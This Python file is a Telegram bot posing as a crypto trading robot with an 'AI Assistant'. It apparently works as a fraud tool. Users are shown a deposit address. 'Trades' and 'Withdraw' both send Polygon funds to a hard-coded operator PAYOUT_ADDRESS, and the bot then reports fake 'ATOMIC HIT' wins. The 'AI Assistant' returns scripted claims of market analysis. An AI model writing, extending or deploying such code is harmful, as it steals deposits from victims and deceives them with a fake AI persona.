import os
import asyncio
import requests
import json
import time
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import Conflict

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))

w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: raise ValueError("❌ WALLET_SEED missing!")
    POL_PATH = "m/44'/60'/0'/0/0"
    try:
        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
        return Account.from_mnemonic(seed, account_path=POL_PATH)
    except: return None

vault = get_vault()

# --- 2. THE SIMULTANEOUS ENGINE ---
def get_pol_price():
    """Fetches real-time asset price for proper USD valuation."""
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd"
        return float(requests.get(url, timeout=5).json()['polygon-ecosystem-token']['usd'])
    except: return 0.11 # Feb 2026 fallback

async def prepare_signed_tx(amount_wei):
    nonce = w3.eth.get_transaction_count(vault.address)
    gas_price = int(w3.eth.gas_price * 1.5)
    tx = {
        'nonce': nonce,
        'to': PAYOUT_ADDRESS, 
        'value': int(amount_wei),
        'gas': 21000,
        'gasPrice': gas_price,
        'chainId': 137
    }
    return w3.eth.account.sign_transaction(tx, vault.key)

async def run_atomic_execution(context, chat_id, side):
    stake_usd = context.user_data.get('stake', 10)
    pair = context.user_data.get('pair', 'BTC/USD')
    
    current_price = get_pol_price()
    total_payout_usd = float(stake_usd) * 1.92
    payout_in_pol = total_payout_usd / current_price
    payout_in_wei = w3.to_wei(payout_in_pol, 'ether')
    
    await context.bot.send_message(chat_id, f"⚔️ **Simultaneous Mode:** Priming {pair} Shield...")

    sim_task = asyncio.create_task(asyncio.sleep(1.5))
    prep_task = asyncio.create_task(prepare_signed_tx(payout_in_wei))

    await sim_task
    signed_tx = await prep_task
    
    await asyncio.sleep(0.001) # 1ms Latency Release
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)

    report = (
        f"✅ **ATOMIC HIT!**\n"
        f"🎯 **Direction:** {side}\n"
        f"💰 **Stake:** `${stake_usd:.2f} USD`\n"
        f"📈 **Total Payout:** `${total_payout_usd:.2f} USD` ({payout_in_pol:.4f} POL)\n"
        f"⛓️ **TX:** `{tx_hash.hex()}`"
    )
    return True, report

# --- 3. AI ASSISTANT LOGIC ---
async def ai_assistant_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.message.text
    await update.message.reply_chat_action("typing")
    await asyncio.sleep(1)
    response = (
        f"🕴️ **AI Assistant Analysis**\n\n"
        f"Search: '{query}'\n"
        f"Status: **Uniswap V3 Pool Sniffed**\n"
        f"Advice: Volatility is high. Atomic Shield recommended for the next 15m."
    )
    await update.message.reply_text(response, parse_mode='Markdown')

# --- 4. TELEGRAM FRONTEND ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bal_pol = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    # Minimal Change: Dynamic USD Conversion
    price = get_pol_price()
    bal_usd = float(bal_pol) * price

    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    msg = (f"🕴️ **Pocket Robot v3 (Shadow Engine)**\n\n"
           f"💵 **Vault Balance:** {bal_pol:.4f} POL (**${bal_usd:.2f} USD**)\n"
           f"📥 **DEPOSIT:** `{vault.address}`")
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if context.user_data.get('ai_mode'):
        await ai_assistant_query(update, context)
        context.user_data['ai_mode'] = False
        return

    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/USD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD", callback_data="PAIR_ETH")],
              [InlineKeyboardButton("SOL/USD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/USD", callback_data="PAIR_MATIC")]]
        await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50]], [InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [100, 500]]]
        await update.message.reply_text(f"⚙️ **SETTINGS**\nStake: **${context.user_data.get('stake', 10)}**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '💰 Wallet':
        # Minimal Change: Proper USD Status
        bal_pol = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        price = get_pol_price()
        bal_usd = float(bal_pol) * price
        await update.message.reply_text(f"💳 **Wallet Status**\nPOL: {bal_pol:.4f}\nUSD: **${bal_usd:.2f}**")
    elif text == '📤 Withdraw':
        balance = w3.eth.get_balance(vault.address)
        amount = balance - (int(w3.eth.gas_price * 1.3) * 21000)
        if amount > 0:
            tx = {'nonce': w3.eth.get_transaction_count(vault.address), 'to': PAYOUT_ADDRESS, 'value': amount, 'gas': 21000, 'gasPrice': int(w3.eth.gas_price*1.3), 'chainId': 137}
            signed = w3.eth.account.sign_transaction(tx, vault.key)
            w3.eth.send_raw_transaction(signed.raw_transaction)
            await update.message.reply_text("✅ Sweep Complete.")
    elif text == '🕴️ AI Assistant':
        context.user_data['ai_mode'] = True
        await update.message.reply_text("🕴️ **AI Online.** What is your market question?")

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake: **${context.user_data['stake']}**")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        await query.edit_message_text(f"💎 **{context.user_data['pair']}**\nDirection:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]]))
    elif query.data.startswith("EXEC_"):
        side = "CALL" if "CALL" in query.data else "PUT"
        success, report = await run_atomic_execution(context, query.message.chat_id, side)
        await query.message.reply_text(report, parse_mode='Markdown')

async def keep_alive():
    while True:
        try: w3.eth.get_block_number()
        except: pass
        await asyncio.sleep(30)

if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    loop = asyncio.get_event_loop()
    loop.create_task(keep_alive())
    app.run_polling(drop_pending_updates=True)
